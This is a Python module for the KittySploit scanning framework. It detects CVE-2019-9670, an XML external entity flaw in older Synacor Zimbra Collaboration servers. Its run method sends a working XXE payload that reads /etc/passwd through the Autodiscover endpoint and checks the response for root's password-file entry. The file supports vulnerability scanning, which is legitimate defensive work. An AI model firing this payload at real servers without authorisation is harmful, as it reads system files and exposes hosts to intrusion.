#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Synacor Zimbra Collaboration Suite 8."""

import re
from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Synacor Zimbra Collaboration <8.7.11p10 - XML External Entity Injection Detection',
        'description': 'Synacor Zimbra Collaboration Suite 8.7.x before 8.7.11p10 has an XML external entity injection (XXE) vulnerability via the mailboxd component.',
        'author': ['KittySploit Team'],
        'severity': 'critical',
        'tags': ['web', 'scanner', 'cve', 'cve2019', 'zimbra', 'xxe', 'kev', 'edb', 'packetstorm', 'synacor', 'vkev', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.4,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'risk_signal',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': [],
            },
        },
        'references': [
            'https://www.exploit-db.com/exploits/46693/',
            'https://wiki.zimbra.com/wiki/Zimbra_Security_Advisories',
            'https://bugzilla.zimbra.com/show_bug.cgi?id=109129',
            'http://www.rapid7.com/db/modules/exploit/linux/http/zimbra_xxe_rce',
            'http://packetstormsecurity.com/files/152487/Zimbra-Collaboration-Autodiscover-Servlet-XXE-ProxyServlet-SSRF.html',
        ],
        'cve': 'CVE-2019-9670',
    }

    def run(self):
        path = '/Autodiscover/Autodiscover.xml'
        r = self.http_request(method='POST', path=path, allow_redirects=False, headers={'Content-Type': 'application/xml'}, data='<!DOCTYPE xxe [\n<!ELEMENT name ANY >\n<!ENTITY xxe SYSTEM "file:///etc/passwd">]>\n<Autodiscover xmlns="http://schemas.microsoft.com/exchange/autodiscover/outlook/responseschema/2006a">\n<Request>\n<EMailAddress>aaaaa</EMailAddress>\n<AcceptableResponseSchema>&xxe;</AcceptableResponseSchema>\n</Request>\n</Autodiscover>\n')
        if not r or r.status_code != 503:
            return False
        body = r.text or ""
        body_regexes = ('root:.*:0:0:', 'Problem accessing',)
        if any(re.search(rx, body) for rx in body_regexes):
            self.set_info(severity='critical', reason='Synacor Zimbra Collaboration <8.7.11p10 - XML External Entity Injection detected', path=path)
            return True
        return False

